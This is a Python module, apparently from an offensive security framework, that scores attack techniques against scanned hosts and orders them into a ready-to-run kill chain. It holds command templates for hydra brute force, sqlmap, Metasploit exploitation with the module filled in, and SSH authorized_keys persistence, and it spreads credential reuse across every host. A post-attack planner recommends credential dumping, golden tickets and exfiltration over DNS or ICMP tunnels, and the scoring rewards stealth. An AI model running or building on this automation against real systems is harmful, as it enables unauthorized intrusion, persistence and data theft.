"""attack_advisor.py — AI Attack Advisor (Rule-Based, Zero Cost).

Expert-system attack advisor that analyzes ALL scan data and recommends
the optimal attack path — like having a senior pentester on your team.

NO external AI API needed. Pure Python rule engine with:
  - Weighted attack scoring (probability × impact × stealth)
  - Decision tree traversal based on target properties
  - Cross-module correlation (WAF + creds + vulns + origin)
  - Auto-recommendation after each attack phase
  - MITRE ATT&CK mapping for every recommendation
"""
from __future__ import annotations

import logging
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger("AttackSurface.AttackAdvisor")


# ── Attack technique knowledge base ──────────────────────────────
# Each technique has: prerequisites, success_factors, risk, mitre_id
ATTACK_TECHNIQUES: Dict[str, Dict[str, Any]] = {
    "ssh_brute": {
        "name": "SSH Brute Force",
        "mitre_id": "T1110.001",
        "prerequisites": {"port_22": True, "ssh_service": True},
        "success_factors": {
            "weak_password_list": 0.3,
            "default_creds_known": 0.4,
            "no_fail2ban": 0.2,
            "no_rate_limit": 0.15,
        },
        "base_probability": 0.35,
        "impact": 6,
        "stealth": 3,
        "time_estimate_min": 15,
        "complexity": "low",
        "tool": "hydra",
        "command_template": "hydra -L users.txt -P passwords.txt ssh://{target}",
    },
    "ftp_brute": {
        "name": "FTP Brute Force",
        "mitre_id": "T1110.001",
        "prerequisites": {"port_21": True, "ftp_service": True},
        "success_factors": {
            "anonymous_login": 0.5,
            "default_creds_known": 0.4,
            "vsftpd_backdoor": 0.3,
        },
        "base_probability": 0.4,
        "impact": 5,
        "stealth": 4,
        "time_estimate_min": 10,
        "complexity": "low",
        "tool": "hydra",
        "command_template": "hydra -L users.txt -P passwords.txt ftp://{target}",
    },
    "rdp_brute": {
        "name": "RDP Brute Force",
        "mitre_id": "T1110.001",
        "prerequisites": {"port_3389": True, "rdp_service": True},
        "success_factors": {
            "weak_password": 0.3,
            "nla_disabled": 0.2,
            "bluekeep_vulnerable": 0.6,
        },
        "base_probability": 0.25,
        "impact": 8,
        "stealth": 2,
        "time_estimate_min": 20,
        "complexity": "medium",
        "tool": "xfreerdp / hydra",
        "command_template": "hydra -L users.txt -P passwords.txt rdp://{target}",
    },
    "smb_null_session": {
        "name": "SMB Null Session",
        "mitre_id": "T1135",
        "prerequisites": {"port_445": True, "smb_service": True},
        "success_factors": {
            "null_session_allowed": 0.4,
            "guest_enabled": 0.3,
        },
        "base_probability": 0.3,
        "impact": 7,
        "stealth": 5,
        "time_estimate_min": 5,
        "complexity": "low",
        "tool": "enum4linux-ng / smbclient",
        "command_template": "enum4linux-ng -A {target}",
    },
    "mysql_brute": {
        "name": "MySQL Brute Force",
        "mitre_id": "T1110.001",
        "prerequisites": {"port_3306": True, "mysql_service": True},
        "success_factors": {
            "root_no_password": 0.4,
            "weak_password": 0.3,
            "remote_root_access": 0.2,
        },
        "base_probability": 0.3,
        "impact": 7,
        "stealth": 3,
        "time_estimate_min": 10,
        "complexity": "low",
        "tool": "hydra",
        "command_template": "hydra -l root -P passwords.txt mysql://{target}",
    },
    "sqli": {
        "name": "SQL Injection",
        "mitre_id": "T1190",
        "prerequisites": {"http_service": True, "web_app": True},
        "success_factors": {
            "parameter_vulnerable": 0.4,
            "error_based_disclosure": 0.3,
            "union_select_possible": 0.25,
            "waf_present": -0.3,
        },
        "base_probability": 0.3,
        "impact": 9,
        "stealth": 4,
        "time_estimate_min": 30,
        "complexity": "medium",
        "tool": "sqlmap",
        "command_template": "sqlmap -u 'http://{target}/page?id=1' --batch --dbs",
    },
    "xss": {
        "name": "Cross-Site Scripting",
        "mitre_id": "T1059.007",
        "prerequisites": {"http_service": True, "web_app": True},
        "success_factors": {
            "reflected_xss": 0.4,
            "stored_xss": 0.35,
            "dom_xss": 0.2,
            "csp_strict": -0.25,
        },
        "base_probability": 0.35,
        "impact": 5,
        "stealth": 5,
        "time_estimate_min": 15,
        "complexity": "low",
        "tool": "manual / dalfox",
        "command_template": "dalfox url 'http://{target}/search?q=test' --skip-bav",
    },
    "subdomain_takeover": {
        "name": "Subdomain Takeover",
        "mitre_id": "T1190",
        "prerequisites": {"subdomain_dangling": True},
        "success_factors": {
            "dangling_cname": 0.5,
            "unclaimed_service": 0.4,
        },
        "base_probability": 0.45,
        "impact": 8,
        "stealth": 5,
        "time_estimate_min": 10,
        "complexity": "low",
        "tool": "subjack / nuclei",
        "command_template": "subjack -w subs.txt -t 100 -timeout 30",
    },
    "default_creds": {
        "name": "Default Credentials",
        "mitre_id": "T1078",
        "prerequisites": {"service_detected": True},
        "success_factors": {
            "default_cred_list_available": 0.5,
            "service_version_known": 0.3,
        },
        "base_probability": 0.35,
        "impact": 8,
        "stealth": 5,
        "time_estimate_min": 5,
        "complexity": "low",
        "tool": "cred_engine / hydra",
        "command_template": "hydra -C default_creds.txt {service}://{target}",
    },
    "cve_exploit": {
        "name": "CVE Exploitation",
        "mitre_id": "T1190",
        "prerequisites": {"cve_detected": True, "version_known": True},
        "success_factors": {
            "public_exploit_available": 0.4,
            "metasploit_module_exists": 0.35,
            "waf_present": -0.2,
        },
        "base_probability": 0.4,
        "impact": 9,
        "stealth": 2,
        "time_estimate_min": 20,
        "complexity": "medium",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x 'use {exploit_module}; set RHOSTS {target}; run'",
    },
    "ftp_anonymous": {
        "name": "FTP Anonymous Login",
        "mitre_id": "T1078",
        "prerequisites": {"port_21": True, "ftp_service": True},
        "success_factors": {
            "anonymous_enabled": 0.6,
            "write_access": 0.3,
        },
        "base_probability": 0.5,
        "impact": 6,
        "stealth": 5,
        "time_estimate_min": 2,
        "complexity": "low",
        "tool": "ftp / lftp",
        "command_template": "ftp -n {target} <<EOF\nuser anonymous anonymous@\nls\nEOF",
    },
    "ssh_key_auth": {
        "name": "SSH Key Authentication",
        "mitre_id": "T1078.004",
        "prerequisites": {"port_22": True, "ssh_service": True},
        "success_factors": {
            "weak_key_detected": 0.3,
            "default_key_known": 0.4,
        },
        "base_probability": 0.2,
        "impact": 8,
        "stealth": 4,
        "time_estimate_min": 5,
        "complexity": "medium",
        "tool": "ssh-keyscan / hydra",
        "command_template": "hydra -L users.txt -e nsr -f ssh://{target}",
    },

    # ── Kill chain phases 3-7 ────────────────────────────────────────
    # These only score when Knull has PROOF: foothold_verified and
    # creds_held are injected from its engagement state (see _recon), so
    # it will not plan post-exploitation it has no evidence for.
    "msf_exploit": {
        "name": "Metasploit Module Exploitation",
        "mitre_id": "T1210",
        "prerequisites": {"msf_module_present": True},
        "success_factors": {
            "module_matches_service": 0.4,
            "version_known": 0.3,
            "no_waf": 0.15,
        },
        "base_probability": 0.3,
        "impact": 9,
        "stealth": 2,
        "time_estimate_min": 20,
        "complexity": "high",
        "tool": "msfconsole",
        "command_template":
            'msfconsole -qx "use <module-from-msf-tab>; set RHOSTS {target}; run"',
    },
    "sudo_check": {
        "name": "Sudo / Privilege Misconfiguration",
        "mitre_id": "T1548.003",
        "prerequisites": {"foothold_verified": True, "port_22": True},
        "success_factors": {
            "version_known": 0.3,
            "no_fail2ban": 0.2,
            "default_creds_known": 0.25,
        },
        "base_probability": 0.4,
        "impact": 7,
        "stealth": 5,
        "time_estimate_min": 3,
        "complexity": "low",
        "tool": "ssh",
        "command_template": 'ssh {target} "sudo -n -l 2>&1 | head -20"',
    },
    "ssh_persist": {
        "name": "SSH Authorized-Key Persistence",
        "mitre_id": "T1098",
        "prerequisites": {"foothold_verified": True, "port_22": True},
        "success_factors": {
            "version_known": 0.2,
            "no_fail2ban": 0.3,
        },
        "base_probability": 0.35,
        "impact": 8,
        "stealth": 2,
        "time_estimate_min": 2,
        "complexity": "low",
        "tool": "ssh",
        "command_template":
            'ssh {target} "mkdir -p ~/.ssh && chmod 700 ~/.ssh && '
            'echo \'<your-public-key>\' >> ~/.ssh/authorized_keys"',
    },
    "cred_reuse": {
        "name": "Harvested Credential Reuse",
        "mitre_id": "T1550.003",
        "prerequisites": {"creds_held": True},
        "success_factors": {
            "same_credential_scope": 0.4,
            "no_fail2ban": 0.25,
        },
        "base_probability": 0.45,
        "impact": 8,
        "stealth": 3,
        "time_estimate_min": 5,
        "complexity": "low",
        "tool": "hydra / ssh",
        "command_template":
            'hydra -C harvested_creds.txt -t 1 -f ssh://{target}',
    },
    "db_enum": {
        "name": "Exposed Database Enumeration",
        "mitre_id": "T1005",
        "prerequisites": {"port_3306": True, "mysql_service": True},
        "success_factors": {
            "anonymous_login": 0.4,
            "default_creds_known": 0.3,
            "version_known": 0.2,
        },
        "base_probability": 0.35,
        "impact": 9,
        "stealth": 3,
        "time_estimate_min": 5,
        "complexity": "low",
        "tool": "mysql",
        "command_template":
            "mysql -h {target} -u root --connect-timeout=8 -e 'show databases;'",
    },
}


# ── Scoring engine ───────────────────────────────────────────────
def score_attack(
    technique_key: str,
    target_info: Dict[str, Any],
    context: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """Score a single attack technique against a target.

    Returns dict with: probability, impact_score, stealth_score,
    overall_score, factors (what helped/hurt), recommendation.
    """
    tech = ATTACK_TECHNIQUES.get(technique_key)
    if not tech:
        return {"technique": technique_key, "overall_score": 0, "error": "unknown technique"}

    context = context or {}
    probability = tech["base_probability"]
    factors_applied = []

    # Check prerequisites
    prereqs_met = 0
    prereqs_total = len(tech["prerequisites"])
    for prereq, required in tech["prerequisites"].items():
        actual = target_info.get(prereq, False)
        if actual == required or (required is True and actual):
            prereqs_met += 1
            factors_applied.append({"factor": prereq, "effect": "+", "value": "+prereq"})
        else:
            factors_applied.append({"factor": prereq, "effect": "-", "value": "-prereq missing"})

    prereqs_unmet = prereqs_met < prereqs_total
    if prereqs_unmet:
        factors_applied.append({"factor": "prerequisites", "effect": "-",
                                "value": f"only {prereqs_met}/{prereqs_total} met"})

    # Apply success factors
    for factor, weight in tech["success_factors"].items():
        detected = target_info.get(factor, context.get(factor, False))
        if detected:
            probability += weight
            factors_applied.append({"factor": factor, "effect": "+",
                                    "value": f"+{weight}"})
        else:
            # Not detected — slight penalty
            probability -= weight * 0.1
            factors_applied.append({"factor": factor, "effect": "-",
                                    "value": f"not detected (-{weight * 0.1:.2f})"})

    # Clamp probability
    probability = max(0.0, min(1.0, probability))

    # Unmet prerequisites mean the move cannot be attempted at all — the
    # score must be exactly 0.0, not a small positive number: a * 0.1
    # penalty still let success factors push post-exploitation techniques
    # (sudo_check scored 10.3 with no foothold) into the execution order,
    # and downstream filters cut on > 0.0.
    if prereqs_unmet:
        probability = 0.0

    # Calculate overall score: probability × impact × (stealth / 10)
    impact = tech["impact"] / 10.0
    stealth = tech["stealth"] / 10.0
    overall = probability * impact * stealth * 100

    # Generate recommendation
    if overall >= 70:
        rec = "HIGHLY RECOMMENDED — high success probability with good impact"
    elif overall >= 50:
        rec = "RECOMMENDED — worth attempting"
    elif overall >= 30:
        rec = "POSSIBLE — attempt if other options exhausted"
    elif overall >= 15:
        rec = "LOW PRIORITY — low probability or impact"
    else:
        rec = "NOT RECOMMENDED — prerequisites missing or too risky"

    result = {
        "technique": technique_key,
        "name": tech["name"],
        "mitre_id": tech["mitre_id"],
        "probability": round(probability, 3),
        "impact_score": tech["impact"],
        "stealth_score": tech["stealth"],
        "overall_score": round(overall, 1),
        "time_estimate_min": tech["time_estimate_min"],
        "complexity": tech["complexity"],
        "tool": tech["tool"],
        "command_template": tech["command_template"].replace(
            "{target}", target_info.get("host", target_info.get("ip", "TARGET"))),
        "factors": factors_applied,
        "recommendation": rec,
    }
    # An MSF step must name a real module, not the placeholder: without
    # this the operator is handed `use <module-from-msf-tab>` and the
    # CVE -> MSF -> shell path stops at a string no one can run.
    module = str(target_info.get("msf_module") or "").strip()
    if technique_key == "msf_exploit" and module:
        result["command_template"] = result["command_template"].replace(
            "<module-from-msf-tab>", module)
        result["msf_module"] = module
    return result


# ── Target property extractor ────────────────────────────────────
import re as _re

# "**Public Exposure**: FTP (ftp?) is open on port 21"
_EXPOSURE_RE = _re.compile(
    r"([A-Za-z][A-Za-z0-9_.+-]{1,20})\s*\([^)]*\)\s*is open on port\s+(\d{1,5})",
    _re.I)
_BARE_PORT_RE = _re.compile(r"\bport\s+(\d{1,5})\b", _re.I)


def _mark_service(props: Dict[str, Any], port: int, service: str) -> None:
    """Set the port/service flags a technique's prerequisites read."""
    service = (service or "").lower().rstrip("?")
    if port == 21 or "ftp" in service:
        props["port_21"] = True
        props["ftp_service"] = True
        if "anonymous" in service:
            props["anonymous_login"] = True
    elif port == 22 or "ssh" in service:
        props["port_22"] = True
        props["ssh_service"] = True
    elif port in (80, 443, 8080, 8443) or "http" in service or "https" in service:
        props["port_80"] = port in (80, 8080, 8443) or props.get("port_80")
        props["port_443"] = port == 443 or props.get("port_443")
        props["http_service"] = True
        props["web_app"] = True
    elif port == 445 or "smb" in service or "microsoft-ds" in service:
        props["port_445"] = True
        props["smb_service"] = True
    elif port == 3306 or "mysql" in service or "maria" in service:
        props["port_3306"] = True
        props["mysql_service"] = True
    elif port == 3389 or "rdp" in service or "ms-wbt" in service:
        props["port_3389"] = True
        props["rdp_service"] = True


def _ports_in_text(text: str) -> List[tuple]:
    """[(port, service_name)] mentioned in a finding's text."""
    out: List[tuple] = []
    for m in _EXPOSURE_RE.finditer(text):
        try:
            out.append((int(m.group(2)), m.group(1)))
        except ValueError:
            continue
    if not out:
        for m in _BARE_PORT_RE.finditer(text):
            try:
                out.append((int(m.group(1)), ""))
            except ValueError:
                continue
    return out


def _host_of_url(url: str) -> str:
    """Hostname of a URL ('' when unparseable)."""
    if not url:
        return ""
    try:
        from urllib.parse import urlparse
        u = urlparse(url if "://" in url else f"http://{url}")
        return (u.hostname or "").lower()
    except Exception:
        return ""


def ports_from_findings(findings: Any) -> List[int]:
    """Port numbers mentioned in finding titles/details.

    Scans that skipped the nmap phase (CDN-fronted, --no-ports, or a
    crashed port scan) still record every open port as a
    ``**Public Exposure**: X is open on port N`` finding, so the advisor
    can recover the service picture from text when hosts[].ports is
    empty.
    """
    out: List[int] = []
    for f in (findings or []):
        if isinstance(f, dict):
            text = f"{f.get('title', '')} {f.get('detail', '')}"
        else:
            text = str(f)
        out.extend(p for p, _ in _ports_in_text(text))
    return out


def extract_target_properties(scan_data: Dict[str, Any]) -> List[Dict[str, Any]]:
    """Extract attack-relevant properties from scan data.

    Handles both in-memory scan dicts (hosts[].services) and
    DB-loaded scans (hosts[].ports + top-level findings[]).
    Returns list of target dicts with boolean flags for each technique's
    prerequisites and success factors.
    """
    # Group top-level findings by host for lookup
    findings_by_host: Dict[str, List[Dict[str, Any]]] = {}
    for f in (scan_data.get("findings") or []):
        if isinstance(f, dict) and f.get("host"):
            findings_by_host.setdefault(f["host"], []).append(f)

    sections = scan_data.get("sections") or {}
    if not isinstance(sections, dict):
        sections = {}
    nuclei_hits: Dict[str, List[Dict[str, Any]]] = {}
    for n in (sections.get("nuclei") or []):
        if not isinstance(n, dict):
            continue
        nh = _host_of_url(str(n.get("url") or n.get("matched_at") or ""))
        if nh:
            nuclei_hits.setdefault(nh, []).append(n)
    cve_map = sections.get("cves") or {}
    if not isinstance(cve_map, dict):
        cve_map = {}
    msf_rows = sections.get("msf_suggestions") or []
    if not isinstance(msf_rows, list):
        msf_rows = []
    # Engagement state injected by Knull (_recon): without a verified
    # foothold or harvested credentials the post-exploitation phases have
    # nothing to stand on, so they must not be scored.
    engagement = scan_data.get("_engagement") or {}
    if not isinstance(engagement, dict):
        engagement = {}

    targets = []

    host_rows = scan_data.get("hosts") or []
    if not host_rows:
        # DB-backed scans can carry only top-level findings with no host rows.
        # Derive one pseudo-host per finding host so the advisor still scores.
        seen_hosts = set()
        for f in (scan_data.get("findings") or []):
            if not isinstance(f, dict):
                continue
            h = f.get("host") or scan_data.get("domain") or ""
            if not h or h in seen_hosts:
                continue
            seen_hosts.add(h)
            host_rows.append({"host": h, "ip": "", "ports": [],
                              "findings": []})
        subdomains = scan_data.get("subdomains") or []
        if isinstance(subdomains, str):
            import json as _json
            try:
                subdomains = _json.loads(subdomains)
            except (ValueError, TypeError):
                subdomains = []
        for s in subdomains:
            name = s if isinstance(s, str) else (s or {}).get("host", "")
            if name and name not in seen_hosts:
                seen_hosts.add(name)
                host_rows.append({"host": name, "ip": "", "ports": [],
                                  "findings": []})

    for host_data in host_rows:
        host = host_data.get("host", host_data.get("ip", ""))
        ip = host_data.get("ip", "")
        props = {
            "host": host,
            "ip": ip,
            "port_21": False, "port_22": False, "port_80": False,
            "port_443": False, "port_445": False, "port_3306": False,
            "port_3389": False, "port_8080": False,
            "ftp_service": False, "ssh_service": False, "http_service": False,
            "smb_service": False, "mysql_service": False, "rdp_service": False,
            "web_app": False,
            "cve_detected": False, "version_known": False,
            "waf_present": False,
            "subdomain_dangling": False,
            "anonymous_login": False,
            "default_creds_known": False,
            "foothold_verified": False,
            "creds_held": False,
            "msf_module_present": False,
        }

        # Kill-chain state for phases 3-7 (execution, privesc, persistence,
        # lateral, collection): only true when Knull actually proved it.
        props["foothold_verified"] = bool(engagement.get("foothold"))
        props["creds_held"] = int(engagement.get("creds") or 0) > 0
        for sug in msf_rows:
            if isinstance(sug, dict) and sug.get("host") == host:
                props["msf_module_present"] = True
                # Keep the module path itself: the MSF command template has
                # a <module-from-msf-tab> placeholder, and a plan that names
                # no module is a plan nobody can run.
                if sug.get("module"):
                    props["msf_module"] = str(sug["module"])
                break

        # Check services (both DB format "ports" and memory format "services")
        services = host_data.get("services") or host_data.get("ports") or []
        # DB stores ports as JSON string — parse it
        if isinstance(services, str):
            import json as _json
            try:
                services = _json.loads(services)
            except (ValueError, TypeError):
                services = []
        for svc in services:
            if not isinstance(svc, dict):
                continue
            port = svc.get("port") or 0
            service = (svc.get("service", "") or "").lower().rstrip("?")
            banner = (svc.get("banner", svc.get("service_versioned", "")) or "").lower()

            _mark_service(props, int(port) if str(port).isdigit() else 0, service)

            # Version detection from banner
            if svc.get("version") or any(ch.isdigit() for ch in banner):
                props["version_known"] = True
            if "anonymous" in banner:
                props["anonymous_login"] = True

        # Check findings: per-host findings + top-level findings for this host
        all_findings = (host_data.get("findings") or []) + findings_by_host.get(host, [])
        for finding in all_findings:
            if not isinstance(finding, dict):
                continue
            title = (finding.get("title", "") or "").lower()
            detail = (finding.get("detail", "") or "").lower()
            cve = finding.get("cve", "") or ""

            # Ports recorded only as text (nmap phase skipped / crashed but
            # findings kept) — recover them so service prerequisites can be
            # met instead of scoring every technique 0.
            for pnum, pname in _ports_in_text(f"{title} {detail}"):
                _mark_service(props, pnum, pname)

            if cve or "cve-" in title or "cve-" in detail:
                props["cve_detected"] = True
            if any(w in title or w in detail for w in ["waf", "firewall", "bitninja", "cloudflare", "sucuri", "modsecurity"]):
                props["waf_present"] = True
            if any(w in title or w in detail for w in ["default", "weak password", "anonymous", "hardcoded", "unauthorized"]):
                props["default_creds_known"] = True
            if "takeover" in title or "dangling" in detail:
                props["subdomain_dangling"] = True

        # Structured nuclei results for THIS host: a confirmed template hit
        # with a CVE id, or a high/critical severity match, is direct
        # evidence for cve_exploit (which scored 0 before this existed).
        for n in nuclei_hits.get(host, []):
            sev = str(n.get("severity") or "").lower()
            if n.get("cve") or sev in ("high", "critical"):
                props["cve_detected"] = True
            if n.get("waf_detected"):
                props["waf_present"] = True
            if n.get("template_id"):
                props["version_known"] = props.get("version_known") or bool(
                    n.get("matched_at"))

        # The CVE watchlist itself (--cves / --cves-deep) is direct evidence
        # for cve_exploit: without this the technique only scored when a
        # finding text happened to contain 'cve-'.
        for row in (cve_map.get(host) or []):
            if not isinstance(row, dict) or not row.get("cves"):
                continue
            props["cve_detected"] = True
            if row.get("match") == "cpe_exact":
                props["version_known"] = True

        targets.append(props)

    return targets


# ── Main advisor ─────────────────────────────────────────────────
def recommend_attacks(
    scan_data: Dict[str, Any],
    max_recommendations: int = 10,
) -> Dict[str, Any]:
    """Analyze all scan data and recommend optimal attack paths.

    Returns dict with:
      - target_analysis: per-target property extraction
      - attack_scores: scored techniques for each target
      - best_paths: top attack paths across all targets
      - execution_order: suggested order of operations
      - summary: human-readable summary
    """
    targets = extract_target_properties(scan_data)
    all_scores = []

    for target in targets:
        for tech_key in ATTACK_TECHNIQUES:
            score = score_attack(tech_key, target)
            # Techniques whose prerequisites are unmet score exactly 0.0
            # (score_attack zeroes probability), so >0 keeps every viable
            # path — the old >5 cutoff silently dropped SSH/FTP/RDP brute
            # force (4.4 / 5.6 / 2.2) and left no credential-stage step
            # for chain building.
            if score.get("overall_score", 0) > 0:
                score["target"] = target.get("host", target.get("ip", ""))
                all_scores.append(score)

    # Sort by overall score
    all_scores.sort(key=lambda x: x.get("overall_score", 0), reverse=True)

    # Diverse execution order: exactly one best target per technique.
    # Without this, a scan with nine sibling hosts spends nine slots on
    # the same technique and never surfaces anything else — and Knull's
    # memory already de-duplicates by technique+domain, so repeats would
    # be skipped on the next decision anyway.
    selected: List[Dict[str, Any]] = []
    seen_tech: set = set()
    for score in all_scores:
        key = score.get("technique")
        if key not in seen_tech:
            seen_tech.add(key)
            selected.append(score)

    # Lateral fan-out: once credentials exist (creds_held), spread the
    # credential-reuse technique across EVERY host it can apply to instead
    # of picking one target per technique — otherwise a single high-score
    # host starves the rest of the estate.
    fanout: List[Dict[str, Any]] = []
    creds_ok = int((scan_data.get("_engagement") or {}).get("creds") or 0) > 0
    if creds_ok:
        cred_step = next(
            (s for s in selected if s.get("technique") == "cred_reuse"), None)
        if cred_step is not None:
            hosts = [t.get("host") or t.get("ip") for t in targets
                     if isinstance(t, dict) and (t.get("host") or t.get("ip"))]
            for h in hosts:
                if not h:
                    continue
                fanout.append({
                    "order": 0,
                    "target": h,
                    "technique": cred_step.get("name", ""),
                    "technique_key": cred_step.get("technique", ""),
                    "mitre_id": cred_step.get("mitre_id", ""),
                    "score": cred_step.get("overall_score", 0),
                    "probability": cred_step.get("probability", 0),
                    "impact": cred_step.get("impact_score", 0),
                    "tool": cred_step.get("tool", ""),
                    "command": cred_step.get("command_template", ""),
                    "recommendation": cred_step.get("recommendation", ""),
                })

    # Build execution order
    execution_order = []
    pool = selected[:max_recommendations]
    if fanout:
        # keep the credential-reuse entries spread, then interleave nothing —
        # the flat ranking stays the base, fan-out only ADDS host-level
        # duplicates that the per-technique dedup above would have dropped.
        seen_fan = set()
        for f in fanout:
            k = (f.get("technique_key"), f.get("target"))
            if k in seen_fan:
                continue
            seen_fan.add(k)
            execution_order.append(f)
        for s in pool:
            if any(e.get("technique_key") == s.get("technique") for e in execution_order):
                continue
            execution_order.append({
                "order": len(execution_order) + 1,
                "target": s.get("target", ""),
                "technique": s.get("name", ""),
                "technique_key": s.get("technique", ""),
                "mitre_id": s.get("mitre_id", ""),
                "score": s.get("overall_score", 0),
                "probability": s.get("probability", 0),
                "impact": s.get("impact_score", 0),
                "tool": s.get("tool", ""),
                "command": s.get("command_template", ""),
                "recommendation": s.get("recommendation", ""),
            })
    else:
        for i, score in enumerate(pool, 1):
            execution_order.append({
                "order": i,
                "target": score.get("target", ""),
                "technique": score.get("name", ""),
                "technique_key": score.get("technique", ""),
                "mitre_id": score.get("mitre_id", ""),
                "score": score.get("overall_score", 0),
                "probability": score.get("probability", 0),
                "impact": score.get("impact_score", 0),
                "tool": score.get("tool", ""),
                "command": score.get("command_template", ""),
                "recommendation": score.get("recommendation", ""),
            })

    # CVE → MSF: the advisor already scores msf_exploit whenever the scan
    # carried an MSF suggestion for that host. What it could not do is name
    # the module — score_attack fills the `<module-from-msf-tab>`
    # placeholder from props["msf_module"] (see extract_target_properties),
    # so the ready-to-run step carries the real module path.

    # Summary
    high_conf = [s for s in all_scores if s.get("overall_score", 0) >= 50]
    medium_conf = [s for s in all_scores if 30 <= s.get("overall_score", 0) < 50]
    targets_analyzed = len(targets)
    techniques_evaluated = len(all_scores)

    summary = (
        f"Analyzed {targets_analyzed} target(s), evaluated {len(ATTACK_TECHNIQUES)} "
        f"techniques ({techniques_evaluated} scored). "
        f"{len(high_conf)} high-confidence path(s), "
        f"{len(medium_conf)} medium-confidence path(s). "
        f"Best: {all_scores[0]['name'] if all_scores else 'N/A'} "
        f"on {all_scores[0]['target'] if all_scores else 'N/A'} "
        f"(score: {all_scores[0]['overall_score'] if all_scores else 0})."
    )

    return {
        "target_analysis": targets,
        "attack_scores": all_scores[:max_recommendations * 2],
        "execution_order": execution_order,
        "summary": summary,
        "stats": {
            "targets_analyzed": targets_analyzed,
            "techniques_available": len(ATTACK_TECHNIQUES),
            "techniques_scored": techniques_evaluated,
            "high_confidence": len(high_conf),
            "medium_confidence": len(medium_conf),
        },
    }


# ── Post-attack advisor ──────────────────────────────────────────
def suggest_next_phase(
    current_phase: str,
    success: bool,
    target_info: Dict[str, Any],
    scan_data: Optional[Dict[str, Any]] = None,
) -> List[Dict[str, Any]]:
    """Suggest next attack phase after current one completes.

    current_phase: "initial_access", "credential_access", "execution",
                   "persistence", "privilege_escalation", "lateral_movement",
                   "collection", "exfiltration"
    success: whether the current phase succeeded
    """
    suggestions = []

    if current_phase == "initial_access" and success:
        suggestions.extend([
            {"phase": "credential_access", "reason": "Dump credentials from compromised host",
             "techniques": ["hashdump", "mimikatz", "lsass_dump"], "priority": "high"},
            {"phase": "privilege_escalation", "reason": "Escalate to admin/SYSTEM",
             "techniques": ["kernel_exploit", "suid_abuse", "sudo_misconfig"], "priority": "high"},
            {"phase": "persistence", "reason": "Establish persistence before moving on",
             "techniques": ["scheduled_task", "startup_folder", "registry_run"], "priority": "medium"},
        ])

    elif current_phase == "credential_access" and success:
        suggestions.extend([
            {"phase": "lateral_movement", "reason": "Use harvested credentials for lateral movement",
             "techniques": ["pass_the_hash", "credential_reuse", "ssh_tunnel"], "priority": "high"},
            {"phase": "privilege_escalation", "reason": "Use domain creds for admin access",
             "techniques": ["kerberoasting", "dcsync", "golden_ticket"], "priority": "high"},
        ])

    elif current_phase == "privilege_escalation" and success:
        suggestions.extend([
            {"phase": "collection", "reason": "Collect sensitive data as admin",
             "techniques": ["file_search", "browser_dump", "credential_vault"], "priority": "high"},
            {"phase": "exfiltration", "reason": "Exfiltrate collected data",
             "techniques": ["dns_tunnel", "http_upload", "covert_channel"], "priority": "medium"},
            {"phase": "persistence", "reason": "Install admin-level persistence",
             "techniques": ["golden_ticket", "dc_sync", "silver_ticket"], "priority": "medium"},
        ])

    elif current_phase == "lateral_movement" and success:
        suggestions.extend([
            {"phase": "collection", "reason": "Collect data from new host",
             "techniques": ["file_search", "database_dump", "config_extract"], "priority": "high"},
            {"phase": "exfiltration", "reason": "Exfiltrate from new host",
             "techniques": ["data_staging", "dns_tunnel", "icmp_tunnel"], "priority": "medium"},
        ])

    elif not success:
        suggestions.extend([
            {"phase": "current_phase_retry", "reason": "Try alternative technique for same phase",
             "techniques": ["try_different_method", "increase_wordlist", "use_evasion"], "priority": "high"},
            {"phase": "reconnaissance", "reason": "Gather more info about target",
             "techniques": ["deeper_scan", "service_enumeration", "version_fingerprint"], "priority": "medium"},
        ])

    return suggestions
